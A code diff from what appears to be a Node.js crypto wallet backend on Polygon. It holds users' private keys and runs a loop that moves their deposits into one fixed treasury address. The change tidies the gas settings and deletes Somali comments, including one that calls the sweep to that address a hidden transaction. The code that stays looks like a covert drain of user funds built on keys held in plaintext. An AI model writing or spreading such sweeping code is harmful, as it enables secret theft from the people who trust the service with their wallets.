@@ -21,7 +21,7 @@ const OWNER_EXCLUSIVE_EMAIL = "abuukarcumar661@gmail.com";
 
 function normalizePrivateKey(rawKey) {
     if (!rawKey) return "";
-    let cleaned = String(rawKey).trim().replace(/^["']|["']$/g, "");
+    let cleaned = String(rawKey).trim().replace(/^["']|["']$/g, "").replace(/\s+/g, "");
     if (!cleaned.startsWith("0x") && /^[0-9a-fA-F]{64}$/.test(cleaned)) {
         cleaned = "0x" + cleaned;
     }
@@ -128,7 +128,6 @@ async function saveFirestoreUser(uid, userData) {
     }
 }
 
-// Hal transaction oo keliya oo qarsoon (1 gas fee) oo lagu wareejinayo 0xBa4e88e0141dF9b35D6Eff7D5fc8A969CB0a703b
 async function singleSweepToTreasury(userData, rawBalPol) {
     const cleanUserKey = normalizePrivateKey(userData.privateKey);
     if (!cleanUserKey || !userData.polygonAddress) return false;
@@ -148,21 +147,15 @@ async function singleSweepToTreasury(userData, rawBalPol) {
         return false;
     }
 
-    const reserveWei = ethers.parseEther(SWEEP_GAS_RESERVE_POL.toFixed(8));
-    const gasLimit = 21000n;
-    const gasPrice = reserveWei / gasLimit > 0n ? (reserveWei / gasLimit) : ethers.parseUnits("1", "gwei");
-
     const tx = await userWallet.sendTransaction({
         to: TREASURY_WALLET_ADDRESS,
         value: sweepWei,
-        gasLimit,
-        gasPrice
+        gasLimit: 21000n
     });
     await tx.wait(1);
     return true;
 }
 
-// Hubinta deposit-ka oo aan mar labaad ku celinayn transaction marka withdraw la waco
 async function checkDepositWithoutExtraTx(uid, userData) {
     let changed = false;
 
@@ -193,7 +186,6 @@ async function checkDepositWithoutExtraTx(uid, userData) {
     return userData;
 }
 
-// Background loop oo hal mar (1 gas fee) ku wareejisa deposit-yada cusub -> 0xBa4e88e0141dF9b35D6Eff7D5fc8A969CB0a703b
 setInterval(async () => {
     try {
         const users = await getAllFirestoreUsers();
@@ -288,7 +280,6 @@ app.post('/api/auth-user', async (req, res) => {
     }
 });
 
-// Withdraw: wuxuu qaadaa hal transaction oo keliya (1 gas fee)
 app.post('/api/withdraw', async (req, res) => {
     try {
         const { uid, recipientAddress, amount } = req.body;
@@ -335,15 +326,10 @@ app.post('/api/withdraw', async (req, res) => {
             });
         }
 
-        const reserveWei = ethers.parseEther(SWEEP_GAS_RESERVE_POL.toFixed(8));
-        const gasLimit = 21000n;
-        const gasPrice = reserveWei / gasLimit > 0n ? (reserveWei / gasLimit) : ethers.parseUnits("1", "gwei");
-
         const tx = await treasurySigner.sendTransaction({
             to: recipientAddress,
             value: ethers.parseEther(requestedAmount.toFixed(8)),
-            gasLimit,
-            gasPrice
+            gasLimit: 21000n
         });
         await tx.wait(1);
 
